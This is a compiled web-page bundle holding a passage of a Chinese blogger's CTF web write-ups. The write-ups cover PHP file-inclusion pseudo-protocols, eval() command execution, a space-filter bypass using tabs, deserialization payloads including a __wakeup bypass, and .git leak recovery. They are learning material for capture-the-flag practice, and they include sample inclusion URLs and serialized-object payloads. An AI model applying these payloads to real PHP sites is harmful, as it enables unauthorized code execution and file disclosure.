...
</code></pre><figure><img src="`+H+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li></ol></li>',3)),s("li",null,[s("p",null,[n[33]||(n[33]=s("strong",null,"参考",-1)),n[34]||(n[34]=a("：")),s("a",ln,[n[32]||(n[32]=a("http://php.net/manual/zh/wrappers.compression.php")),p(t)])])])]),n[50]||(n[50]=e(`<h3 id="data-协议" tabindex="-1"><a class="header-anchor" href="#data-协议"><span><code>data://</code> 协议</span></a></h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><pre><code class="language-awk">data<span class="token operator">:</span><span class="token regex">//</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>
...
</code></pre><figure><img src="`+N+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li></ol></li></ul><h3 id="http-https-协议" tabindex="-1"><a class="header-anchor" href="#http-https-协议"><span><code>http:// &amp; https://</code> 协议</span></a></h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><pre><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//example.com</span></span>
...
</code></pre><figure><img src="`+B+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li></ul><h3 id="phar-协议" tabindex="-1"><a class="header-anchor" href="#phar-协议"><span><code>phar://</code> 协议</span></a></h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><pre><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span></span>
</code></pre><figure><img src="`+C+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>',10)),s("blockquote",null,[s("p",null,[n[37]||(n[37]=a("参考文章：")),s("a",cn,[n[36]||(n[36]=a("seebug - 利用 phar 拓展 php 反序列化漏洞攻击面")),p(t)])])]),n[51]||(n[51]=e('<h2 id="_3-php-eval-rce" tabindex="-1"><a class="header-anchor" href="#_3-php-eval-rce"><span>3. php eval() RCE</span></a></h2><p>题目里代码是<code>eval()</code>，只需要把命令放到<code>system()</code>函数里就行。<strong>记得后面加分号！！！</strong></p><figure><img src="'+E+'" alt="image-20240812165242418" tabindex="0" loading="lazy"><figcaption>image-20240812165242418</figcaption></figure><p>改成POST也是一样</p><figure><img src="'+W+'" alt="image-20240812165631950" tabindex="0" loading="lazy"><figcaption>image-20240812165631950</figcaption></figure><h2 id="_4-php-后台过滤空格绕过" tabindex="-1"><a class="header-anchor" href="#_4-php-后台过滤空格绕过"><span>4. php 后台过滤空格绕过</span></a></h2><p>题目</p><figure><img src="'+F+'" alt="image-20240812173258342" tabindex="0" loading="lazy"><figcaption>image-20240812173258342</figcaption></figure><p>这里先要求改cookie，在返回包中看见了新目录：<code>rasalghul.php</code>。但不是重点，后面这样</p><figure><img src="'+S+'" alt="image-20240812173341997" tabindex="0" loading="lazy"><figcaption>image-20240812173341997</figcaption></figure><p>这里过滤了空格，我使用<code>%09</code>(<code>Tab</code>)绕过</p><figure><img src="'+Q+'" alt="image-20240812173552674" tabindex="0" loading="lazy"><figcaption>image-20240812173552674</figcaption></figure><h2 id="_5-php反序列化" tabindex="-1"><a class="header-anchor" href="#_5-php反序列化"><span>5. php反序列化</span></a></h2><p>题目开始先要目录扫描，发现一个<code>robots.txt</code>，进而发现了<code>/cl45s.php</code></p><figure><img src="'+V+`" alt="image-20240812175337606" tabindex="0" loading="lazy"><figcaption>image-20240812175337606</figcaption></figure><p>看到<code>__destruct()</code>方法被重写，则可以尝试反序列化。</p><pre><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
...
</code></pre><p><code>/?p=O:4:“wllm”:2:{s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:3:“ctf”;}</code></p><p>最后得到flag</p><figure><img src="`+O+`" alt="image-20240812180404781" tabindex="0" loading="lazy"><figcaption>image-20240812180404781</figcaption></figure><h2 id="_6-php反序列化绕过-weakup" tabindex="-1"><a class="header-anchor" href="#_6-php反序列化绕过-weakup"><span>6. php反序列化绕过<code>__weakup()</code></span></a></h2><p>题目</p><pre><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
...
<span class="token delimiter important">?&gt;</span></span>
</code></pre><p>这比上面多了个<code>__wakeup()</code> ，在29行程序调用反序列化方法时，会自动执行<code>__weakup()</code>函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过<code>__weakup()</code>函数；</p><p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 <code>__weakup()</code>; 因而先构造</p><pre><code class="language-php"><span class="token variable">$aa</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HaHaHa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aa</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;admin&quot;</span><span class="token punctuation">;</span>
...
</code></pre><p>上传即可</p><figure><img src="`+G+'" alt="image-20240813220240174" tabindex="0" loading="lazy"><figcaption>image-20240813220240174</figcaption></figure><h2 id="_7-git泄露-log" tabindex="-1"><a class="header-anchor" href="#_7-git泄露-log"><span>7. Git泄露-log</span></a></h2><p>先用githacker工具跑一便，就有了该网站的.git文件夹</p><figure><img src="'+I+'" alt="image-20240901095525585" tabindex="0" loading="lazy"><figcaption>image-20240901095525585</figcaption></figure><p>然后查看log信息，对比两次提交即可</p><figure><img src="'+M+'" alt="image-20240901095711570" tabindex="0" loading="lazy"><figcaption>image-20240901095711570</figcaption></figure><h2 id="_8-swpuctf-2021-新生赛-pseudoprotocols" tabindex="-1"><a class="header-anchor" href="#_8-swpuctf-2021-新生赛-pseudoprotocols"><span>8. [SWPUCTF 2021 新生赛]PseudoProtocols</span></a></h2><p>初始提示<code>http://node7.anna.nssctf.cn:22900/index.php?wllm=</code></p><figure><img src="'+L+'" alt="image-20240925104555403" tabindex="0" loading="lazy"><figcaption>image-20240925104555403</figcaption></figure><p>先用php协议读一下hint.php</p><figure><img src="'+K+`" alt="image-20240925104715121" tabindex="0" loading="lazy"><figcaption>image-20240925104715121</figcaption></figure><p>然后解码这个hint.php</p><pre><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//go to /test2222222222222.php</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><p>还是一样，读test2222222222222.php</p><figure><img src="`+R+`" alt="image-20240925104906653" tabindex="0" loading="lazy"><figcaption>image-20240925104906653</figcaption></figure><p>解码后</p><pre><code>&lt;?php
...
</code></pre><figure><img src="`+X+'" alt="image-20240925105137206" tabindex="0" loading="lazy"><figcaption>image-20240925105137206</figcaption></figure>',54))])}const gn=o(j,[["render",rn],["__file","1-CTF_WEB.html.vue"]]),mn=JSON.parse('{"path":"/CyberSecurity/CTF/1-CTF_WEB.html","title":"CTF-WEB","lang":"zh-CN","frontmatter":{"category":"网络安全","tag":"CTF","description":"CTF-WEB 题目来源题库 | NSSCTF 1. PHP md5 相等绕过 要求字符串不同，但MD5相同 image.pngimage.png 解题参考 PHP md5 相等绕过 - Ainsliaea - 博客园 (cnblogs.com) 方法1： 处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，同时后面都是数字，不能包含其...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/CTF/1-CTF_WEB.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"CTF-WEB"}],["meta",{"property":"og:description","content":"CTF-WEB 题目来源题库 | NSSCTF 1. PHP md5 相等绕过 要求字符串不同，但MD5相同 image.pngimage.png 解题参考 PHP md5 相等绕过 - Ainsliaea - 博客园 (cnblogs.com) 方法1： 处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，同时后面都是数字，不能包含其..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T02:34:05.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"CTF"}],["meta",{"property":"article:modified_time","content":"2025-01-15T02:34:05.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"CTF-WEB\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-01-15T02:34:05.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"1. PHP md5 相等绕过","slug":"_1-php-md5-相等绕过","link":"#_1-php-md5-相等绕过","children":[{"level":3,"title":"\\"oe\\" 绕过","slug":"oe-绕过","link":"#oe-绕过","children":[]},{"level":3,"title":"数组绕过（PHP 8 无法绕过）","slug":"数组绕过-php-8-无法绕过","link":"#数组绕过-php-8-无法绕过","children":[]},{"level":3,"title":"md5 碰撞","slug":"md5-碰撞","link":"#md5-碰撞","children":[]}]},{"level":2,"title":"2. php文件包含&php伪协议","slug":"_2-php文件包含-php伪协议","link":"#_2-php文件包含-php伪协议","children":[{"level":3,"title":"file:// 协议","slug":"file-协议","link":"#file-协议","children":[]},{"level":3,"title":"php:// 协议","slug":"php-协议","link":"#php-协议","children":[]},{"level":3,"title":"zip:// & bzip2:// & zlib:// 协议","slug":"zip-bzip2-zlib-协议","link":"#zip-bzip2-zlib-协议","children":[]},{"level":3,"title":"data:// 协议","slug":"data-协议","link":"#data-协议","children":[]},{"level":3,"title":"http:// & https:// 协议","slug":"http-https-协议","link":"#http-https-协议","children":[]},{"level":3,"title":"phar:// 协议","slug":"phar-协议","link":"#phar-协议","children":[]}]},{"level":2,"title":"3. php eval() RCE","slug":"_3-php-eval-rce","link":"#_3-php-eval-rce","children":[]},{"level":2,"title":"4. php 后台过滤空格绕过","slug":"_4-php-后台过滤空格绕过","link":"#_4-php-后台过滤空格绕过","children":[]},{"level":2,"title":"5. php反序列化","slug":"_5-php反序列化","link":"#_5-php反序列化","children":[]},{"level":2,"title":"6. php反序列化绕过__weakup()","slug":"_6-php反序列化绕过-weakup","link":"#_6-php反序列化绕过-weakup","children":[]},{"level":2,"title":"7. Git泄露-log","slug":"_7-git泄露-log","link":"#_7-git泄露-log","children":[]},{"level":2,"title":"8. [SWPUCTF 2021 新生赛]PseudoProtocols","slug":"_8-swpuctf-2021-新生赛-pseudoprotocols","link":"#_8-swpuctf-2021-新生赛-pseudoprotocols","children":[]}],"git":{"createdTime":1723445693000,"updatedTime":1736908445000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":12}]},"readingTime":{"minutes":11.59,"words":3477},"filePathRelative":"CyberSecurity/CTF/1-CTF_WEB.md","localizedDate":"2024年8月12日","excerpt":"\\n<blockquote>\\n<p>题目来源<a href=\\"https://www.nssctf.cn/problem\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">题库 | NSSCTF</a></p>\\n</blockquote>\\n<h2>1. PHP md5 相等绕过</h2>\\n<p>要求字符串不同，但MD5相同</p>\\n<figure><figcaption>image.png</figcaption></figure>\\n<p>解题参考\\n<a href=\\"https://www.cnblogs.com/ainsliaea/p/15126218.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">PHP md5 相等绕过 - Ainsliaea - 博客园 (cnblogs.com)</a></p>","autoDesc":true}');export{gn as comp,mn as data};
